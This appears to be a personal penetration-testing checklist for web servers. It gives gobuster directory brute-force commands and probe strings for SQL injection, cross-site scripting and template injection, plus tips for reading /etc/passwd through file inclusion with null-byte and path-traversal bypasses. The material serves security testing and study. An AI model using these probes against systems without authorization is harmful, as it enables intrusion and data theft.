# 2 HTTP

## Manual scanning

- Check for `robots.txt` file.
- Check out the page's source code using dev tools.
- Software detection. Does the software have known vulnerabilities?
- Software detection. Does this site / software have default credentials?

## Automated scanning

- Run `gobuster` for finding directories on the web server.

```shell
gobuster dir --url http://$ip --wordlist=/usr/share/dirb/wordlists/common.txt | tee gobuster/common.txt
```

```shell
gobuster dir --url http://$ip --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | tee gobuster/medium.txt
```

```shell
gobuster dir --url http://$ip --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,html,php | tee gobuster/extensions.txt
```

- Run `ffuf` for subdomain enumeration. 


## Injection attacks

- Check for SQL injection points using

```
' or 1=1--
```
```
' or 1=1 -- -
```

- Check for XSS (cross site scripting) vulnerabilities using

```
<h1>Hi</h1>
```
```
<script>alert('hi');</script>
```

- Check for SSTI (server side template injection) using

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

See [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) for more information on server side template injection.

## File inclusion

- Check for file inclusions to the file `/etc/passwd`.
- Use null bytes `%00` to surpass forced file extensions.
- Add suffix `/etc/passwd/.` to bypass file blacklisting.
- Use relative paths `dir/../../file/path` to bypass dir whitelisting.
- Go for remote file inclusions.

